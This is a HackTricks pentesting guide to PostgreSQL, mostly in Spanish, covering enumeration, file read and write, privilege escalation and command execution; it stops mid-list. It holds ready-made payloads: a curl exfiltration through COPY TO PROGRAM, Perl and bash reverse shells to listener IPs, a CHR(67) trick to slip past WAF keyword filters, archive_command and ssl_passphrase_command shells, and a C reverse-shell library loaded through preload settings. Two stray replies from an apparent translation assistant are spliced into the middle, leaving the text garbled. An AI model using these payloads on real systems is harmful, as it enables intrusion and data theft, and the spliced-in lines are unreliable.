# 5432,5433 - Pentesting Postgresql

{{#include ../banners/hacktricks-training.md}}

## **Información básica**

**PostgreSQL** se describe como un sistema de base de datos objeto-relacional que es de código abierto. Este sistema no solo utiliza el lenguaje SQL, sino que también lo mejora con funciones adicionales. Sus capacidades le permiten manejar una amplia gama de tipos de datos y operaciones, lo que lo convierte en una opción versátil para desarrolladores y organizaciones.

**Default port:** 5432, y si este puerto ya está en uso parece que postgresql usará el siguiente puerto (probablemente 5433) que no esté en uso.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Conexión & Basic Enum
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Si al ejecutar **`\list`** encuentras una base de datos llamada **`rdsadmin`** sabes que estás dentro de una **AWS postgresql database**.

Para más información sobre **cómo abusar de una base de datos PostgreSQL** consulta:


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Enumeración Automática
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Escaneo de puertos**

Según [**this research**](https://www.exploit-db.com/papers/13084), cuando un intento de conexión falla, `dblink` lanza una excepción `sqlclient_unable_to_establish_sqlconnection` que incluye una explicación del error. A continuación se muestran ejemplos de estos detalles.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Host está caído

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

- Port está cerrado
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Port está abierto
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
No veo el contenido a traducir. Por favor pega el texto del archivo src/network-services-pentesting/pentesting-postgresql.md o indica qué sección quieres traducir. Nota: no traduciré código, nombres de técnicas, rutas, etiquetas ni enlaces.
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Port está abierto o filtrado
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
En funciones PL/pgSQL, actualmente no es posible obtener detalles de excepciones. Sin embargo, si tienes acceso directo al servidor PostgreSQL, puedes recuperar la información necesaria. Si extraer nombres de usuario y contraseñas de las tablas del sistema no es factible, considera utilizar el método de ataque por wordlist discutido en la sección anterior, ya que podría dar resultados positivos.

## Enumeration of Privileges

### Roles

| Role Types     |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | El rol tiene privilegios de superusuario                                                                                                             |
| rolinherit     | El rol hereda automáticamente los privilegios de los roles de los que es miembro                                                                     |
| rolcreaterole  | El rol puede crear otros roles                                                                                                                       |
| rolcreatedb    | El rol puede crear bases de datos                                                                                                                    |
| rolcanlogin    | El rol puede iniciar sesión. Es decir, este rol puede asignarse como identificador inicial de autorización de sesión                                 |
| rolreplication | El rol es un rol de replicación. Un rol de replicación puede iniciar conexiones de replicación y crear y eliminar slots de replicación              |
| rolconnlimit   | Para roles que pueden iniciar sesión, esto establece el número máximo de conexiones concurrentes que este rol puede realizar. -1 significa sin límite. |
| rolpassword    | No es la contraseña (siempre aparece como `********`)                                                                                                |
| rolvaliduntil  | Fecha de expiración de la contraseña (solo usada para autenticación por contraseña); null si no hay expiración                                       |
| rolbypassrls   | El rol omite todas las políticas de seguridad a nivel de fila; consulta [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) para más información. |
| rolconfig      | Valores predeterminados específicos del rol para variables de configuración en tiempo de ejecución                                                   |
| oid            | ID del rol                                                                                                                                            |

#### Interesting Groups

- Si eres miembro de **`pg_execute_server_program`** puedes **ejecutar** programas
- Si eres miembro de **`pg_read_server_files`** puedes **leer** archivos
- Si eres miembro de **`pg_write_server_files`** puedes **escribir** archivos

> [!TIP]
> Ten en cuenta que en Postgres un **user**, un **group** y un **role** son lo **mismo**. Solo depende de **cómo lo uses** y si **le permites iniciar sesión**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tablas
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funciones
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Acciones del sistema de archivos

### Leer directorios y archivos

A partir de este [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) los miembros del grupo definido **`DEFAULT_ROLE_READ_SERVER_FILES`** (llamado **`pg_read_server_files`**) y los superusuarios pueden usar el método **`COPY`** en cualquier ruta (consulta `convert_and_check_filename` en `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Recuerda que si no eres superusuario pero tienes el permiso **CREATEROLE** puedes **hacerte miembro de ese grupo:**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Hay **otras funciones de postgres** que pueden usarse para **leer archivos o listar un directorio**. Solo **superusuarios** y **usuarios con permisos explícitos** pueden usarlas:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Puedes encontrar **más funciones** en [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Escritura de archivos simple

Solo **super users** y miembros de **`pg_write_server_files`** pueden usar copy para escribir archivos.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Recuerda que si no eres superusuario pero tienes el permiso **`CREATEROLE`** puedes **hacerte miembro de ese grupo:**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Recuerda que COPY no puede manejar caracteres de nueva línea, por lo tanto incluso si estás usando una carga útil base64 y **debes enviar una sola línea**.\
Una limitación muy importante de esta técnica es que **`copy` no puede usarse para escribir archivos binarios ya que modifica algunos valores binarios.**

### **Subida de archivos binarios**

Sin embargo, existen **otras técnicas para subir archivos binarios grandes:**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Actualizar datos de tablas PostgreSQL mediante escritura de archivos locales

Si tienes los permisos necesarios para leer y escribir archivos del servidor PostgreSQL, puedes actualizar cualquier tabla en el servidor sobrescribiendo el **associated file node** en [the PostgreSQL data directory](https://www.postgresql.org/docs/8.1/storage.html). **More on this technique** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Required steps:

1.  Obtener el directorio de datos de PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Nota:** Si no puedes recuperar la ruta del directorio de datos actual desde settings, puedes consultar la versión mayor de PostgreSQL con la consulta `SELECT version()` y intentar adivinar por fuerza bruta la ruta. Las rutas comunes del directorio de datos en instalaciones Unix de PostgreSQL son `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Un nombre de cluster común es `main`.

2.  Obtener la ruta relativa al filenode, asociado con la tabla objetivo

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Esta consulta debería devolver algo como `base/3/1337`. La ruta completa en disco será `$DATA_DIRECTORY/base/3/1337`, es decir `/var/lib/postgresql/13/main/base/3/1337`.

3.  Descargar el filenode mediante las funciones `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Obtener el tipo de dato asociado con la tabla objetivo

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Usa el [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) para [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); establece todos los flags booleanos `rol*` a 1 para permisos completos.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Volver a subir el filenode editado mediante las funciones `lo_*`, y sobrescribir el archivo original en el disco

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Opcionalmente)_ Limpia la caché de tablas en memoria ejecutando una consulta SQL costosa

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Ahora deberías ver los valores actualizados de la tabla en PostgreSQL.

También puedes convertirte en superadmin editando la tabla `pg_authid`. **See** [**the following section**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE to program**

Since[ version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), only **super users** and member of the group **`pg_execute_server_program`** can use copy for RCE (example with exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Necesito el contenido del archivo src/network-services-pentesting/pentesting-postgresql.md (o el fragmento que quieras traducir). Por favor pega aquí el texto completo en markdown. 

Recordatorio: no traduciré código, nombres de técnicas, palabras comunes de hacking, nombres de plataformas cloud/SaaS, rutas/links ni etiquetas/refs como {#tabs}, {#ref} ni paths.
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Recuerda que si no eres superusuario pero tienes el permiso **`CREATEROLE`** puedes **hacerte miembro de ese grupo:**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

O usa el módulo `multi/postgres/postgres_copy_from_program_cmd_exec` de **metasploit**.\
Más información sobre esta vulnerabilidad [**here**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Aunque reportado como CVE-2019-9193, Postges declaró que esto era una [feature and will not be fixed](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

#### Evadir filtros de palabras clave/WAF para llegar a COPY PROGRAM

En contextos de SQLi con consultas apiladas, un WAF puede eliminar o bloquear la palabra clave literal `COPY`. Puedes construir dinámicamente la sentencia y ejecutarla dentro de un bloque PL/pgSQL DO. Por ejemplo, construye la C inicial con `CHR(67)` para evadir filtros ingenuos y EXECUTE el comando ensamblado:
```sql
DO $$
DECLARE cmd text;
BEGIN
cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
EXECUTE cmd;
END $$;
```
Este patrón evita el filtrado por palabras clave estáticas y aun así consigue ejecución de comandos del sistema operativo vía `COPY ... PROGRAM`. Es especialmente útil cuando la aplicación muestra errores SQL y permite consultas apiladas.

### RCE con lenguajes de PostgreSQL


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE con extensiones de PostgreSQL

Una vez que hayas **aprendido** en la entrada anterior **cómo subir archivos binarios**, podrías intentar obtener **RCE subiendo una extensión de PostgreSQL y cargándola**.


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### RCE del archivo de configuración de PostgreSQL

> [!TIP]
> Los siguientes vectores de RCE son especialmente útiles en contextos de SQLi restringidos, ya que todos los pasos pueden realizarse mediante sentencias SELECT anidadas

El **archivo de configuración** de PostgreSQL es **escribible** por el **usuario postgres**, que es quien ejecuta la base de datos, por lo que como **superusuario** puedes escribir archivos en el sistema de archivos, y por lo tanto puedes **sobrescribir este archivo.**

![](<../images/image (322).png>)

#### **RCE con ssl_passphrase_command**

More information [about this technique here](https://pulsesecurity.co.nz/articles/postgres-sqli).

El archivo de configuración tiene algunos atributos interesantes que pueden conducir a RCE:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Ruta a la clave privada de la base de datos
- `ssl_passphrase_command = ''` Si el archivo privado está protegido por contraseña (encriptado) postgresql **ejecutará el comando indicado en este atributo**.
- `ssl_passphrase_command_supports_reload = off` **Si** este atributo está **on**, el **comando** que se ejecute si la clave está protegida por contraseña **se ejecutará** cuando `pg_reload_conf()` sea **ejecutado**.

Entonces, un atacante necesitará:

1. **Extraer la clave privada** del servidor
2. **Cifrar** la clave privada descargada:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Sobrescribir**
4. **Volcar** la **configuración** actual de PostgreSQL
5. **Sobrescribir** la **configuración** con la configuración de atributos mencionada:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Ejecutar `pg_reload_conf()`

Al probar esto noté que solo funcionará si el **archivo de clave privada tiene permisos 640**, es **propiedad de root** y del **grupo ssl-cert o postgres** (para que el usuario postgres pueda leerlo), y está ubicado en _/var/lib/postgresql/12/main_.

#### **RCE con archive_command**

**More** [**information about this config and about WAL here**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Otro atributo en el archivo de configuración que es explotable es `archive_command`.

Para que esto funcione, la configuración `archive_mode` debe ser `'on'` o `'always'`. Si eso es cierto, entonces podríamos sobrescribir el comando en `archive_command` y forzarlo a ejecutarse mediante las operaciones WAL (write-ahead logging).

Los pasos generales son:

1. Comprobar si archive_mode está habilitado: `SELECT current_setting('archive_mode')`
2. Sobrescribir `archive_command` con el payload. Por ejemplo, un reverse shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RETU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Recargar la configuración: `SELECT pg_reload_conf()`
4. Forzar que la operación WAL se ejecute, lo que invocará `archive_command`: `SELECT pg_switch_wal()` o `SELECT pg_switch_xlog()` en algunas versiones de Postgres

##### Editando postgresql.conf vía Large Objects (SQLi-friendly)

Cuando se necesitan escrituras multilínea (por ejemplo, para establecer múltiples GUCs), usa PostgreSQL Large Objects para leer y sobrescribir la configuración completamente desde SQL. Este enfoque es ideal en contextos SQLi donde `COPY` no puede manejar nuevas líneas o escrituras seguras para binarios.

Example (adjust the major version and path if needed, e.g. version 15 on Debian):
```sql
-- 1) Import the current configuration and note the returned OID (example OID: 114575)
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');

-- 2) Read it back as text to verify
SELECT encode(lo_get(114575), 'escape');

-- 3) Prepare a minimal config snippet locally that forces execution via WAL
--    and base64-encode its contents, for example:
--    archive_mode = 'always'\n
--    archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'\n
--    archive_timeout = 1\n
--    Then write the new contents into a new Large Object and export it over the original file
SELECT lo_from_bytea(223, decode('<BASE64_POSTGRESQL_CONF>', 'base64'));
SELECT lo_export(223, '/etc/postgresql/15/main/postgresql.conf');

-- 4) Reload the configuration and optionally trigger a WAL switch
SELECT pg_reload_conf();
-- Optional explicit trigger if needed
SELECT pg_switch_wal();  -- or pg_switch_xlog() on older versions
```
Esto produce una ejecución fiable de comandos del OS vía `archive_command` como el usuario `postgres`, siempre que `archive_mode` esté habilitado. En la práctica, configurar un `archive_timeout` bajo puede provocar invocaciones rápidas sin requerir un WAL switch explícito.

#### **RCE con preload libraries**

Más información [about this technique here](https://adeadfed.com/posts/postgresql-select-only-rce/).

Este vector de ataque aprovecha las siguientes variables de configuración:

- `session_preload_libraries` -- librerías que serán cargadas por el servidor PostgreSQL en la conexión del cliente.
- `dynamic_library_path` -- lista de directorios donde el servidor PostgreSQL buscará las librerías.

Podemos establecer el valor de `dynamic_library_path` a un directorio escribible por el usuario `postgres` que ejecuta la base de datos, p. ej., el directorio `/tmp/`, y subir allí un objeto malicioso `.so`. A continuación, forzaremos al servidor PostgreSQL a cargar nuestra librería recién subida incluyéndola en la variable `session_preload_libraries`.

Los pasos del ataque son:

1. Download the original `postgresql.conf`
2. Include the `/tmp/` directory in the `dynamic_library_path` value, e.g. `dynamic_library_path = '/tmp:$libdir'`
3. Include the malicious library name in the `session_preload_libraries` value, e.g. `session_preload_libraries = 'payload.so'`
4. Check major PostgreSQL version via the `SELECT version()` query
5. Compile the malicious library code with the correct PostgreSQL dev package Sample code:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Compiling the code:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Upload the malicious `postgresql.conf`, created in steps 2-3, and overwrite the original one
7. Upload the `payload.so` from step 5 to the `/tmp` directory
8. Reload the server configuration by restarting the server or invoking the `SELECT pg_reload_conf()` query
9. At the next DB connection, you will receive the reverse shell connection.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

According to the [**docs**](https://www.postgresql.org/docs/13/sql-grant.html): _Los roles que tienen el privilegio **`CREATEROLE`** pueden **otorgar o revocar la membresía en cualquier rol** que **no** sea un **superuser**._

So, if you have **`CREATEROLE`** permission you could grant yourself access to other **roles** (that aren't superuser) that can give you the option to read & write files and execute commands:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Modificar contraseña

Los usuarios con este rol también pueden **cambiar** las **contraseñas** de otros **non-superusers**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

Es bastante común encontrar que **usuarios locales pueden iniciar sesión en PostgreSQL sin proporcionar ninguna contraseña**. Por lo tanto, una vez que hayas obtenido **permisos para ejecutar código** puedes abusar de estos permisos para otorgarte el rol **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!TIP]
> Esto suele ser posible debido a las siguientes líneas en el archivo **`pg_hba.conf`**:
>
> ```bash
> # "local" is for Unix domain socket connections only
> local   all             all                                     trust
> # IPv4 local connections:
> host    all             all             127.0.0.1/32            trust
> # IPv6 local connections:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

En [**este artículo**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) se explica cómo fue posible realizar **privesc** en Postgres GCP abusando del privilegio ALTER TABLE que se otorgó al usuario.

Cuando intentas **hacer que otro usuario sea propietario de una tabla** deberías obtener un **error** que lo impida, pero aparentemente GCP dio esa **opción al usuario postgres que no es superuser** en GCP:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Uniendo esta idea con el hecho de que cuando los comandos **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) se ejecutan sobre una **tabla con una función de índice**, la **función** es **llamada** como parte del comando con los permisos del **propietario** de la **tabla**. Es posible crear un índice con una función y otorgar permisos de propietario a un **super user** sobre esa tabla, y luego ejecutar ANALYZE sobre la tabla con la función maliciosa que podrá ejecutar comandos porque está usando los privilegios del propietario.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Explotación

1. Comience creando una nueva tabla.
2. Inserte contenido irrelevante en la tabla para proporcionar datos a la función de índice.
3. Desarrolle una función de índice maliciosa que contenga una carga útil de ejecución de código, permitiendo ejecutar comandos no autorizados.
4. ALTER el propietario de la tabla a "cloudsqladmin", que es el rol de superusuario de GCP usado exclusivamente por Cloud SQL para gestionar y mantener la base de datos.
5. Ejecute una operación ANALYZE en la tabla. Esta acción obliga al motor de PostgreSQL a cambiar al contexto de usuario del propietario de la tabla, "cloudsqladmin". En consecuencia, la función de índice maliciosa se invoca con los permisos de "cloudsqladmin", habilitando así la ejecución del comando de shell previamente no autorizado.

En PostgreSQL, este flujo se ve algo así:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Entonces, la tabla `shell_commands_results` contendrá la salida del código ejecutado:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Inicio de sesión local

Algunas instancias de postgresql mal configuradas podrían permitir el inicio de sesión de cualquier usuario local; es posible conectarse desde 127.0.0.1 usando la función **`dblink`**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Ten en cuenta que para que la consulta anterior funcione **la función `dblink` debe existir**. Si no existe, puedes intentar crearla con
>
> ```sql
> CREATE EXTENSION dblink;
> ```
>
> Si tienes la contraseña de un usuario con más privilegios, pero el usuario no está permitido iniciar sesión desde una IP externa, puedes usar la siguiente función para ejecutar consultas como ese usuario:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Es posible comprobar si esta función existe con:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Función definida personalizada con** SECURITY DEFINER

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters pudieron privesc dentro de una instancia de postgres proporcionada por IBM, porque **encontraron esta función con el flag SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

As [**explained in the docs**](https://www.postgresql.org/docs/current/sql-createfunction.html) una función con **SECURITY DEFINER se ejecuta** con los privilegios del **usuario que la posee**. Por lo tanto, si la función es **vulnerable a SQL Injection** o realiza algunas **acciones privilegiadas con parámetros controlados por el atacante**, podría ser abusada para **escalar privilegios dentro de postgres**.

En la línea 4 del código anterior puedes ver que la función tiene el **SECURITY DEFINER** flag.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
And then **execute commands**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Realizar Brute-force con PL/pgSQL

**PL/pgSQL** is a **fully featured programming language** that offers greater procedural control compared to SQL. It enables the use of **loops** and other **control structures** to enhance program logic. In addition, **SQL statements** and **triggers** have the capability to invoke functions that are created using the **PL/pgSQL language**. This integration allows for a more comprehensive and versatile approach to database programming and automation.\
**Puedes abusar de este lenguaje para pedirle a PostgreSQL que realice brute-force sobre las credenciales de los usuarios.**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc al sobrescribir tablas internas de PostgreSQL

> [!TIP]
> El siguiente vector de privesc es especialmente útil en contextos de SQLi restringidos, ya que todos los pasos se pueden realizar mediante SELECT anidados

If you can **read and write PostgreSQL server files**, you can **become a superuser** by overwriting the PostgreSQL on-disk filenode, associated with the internal `pg_authid` table.

Read more about **esta técnica** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

The attack steps are:

1. Obtain the PostgreSQL data directory
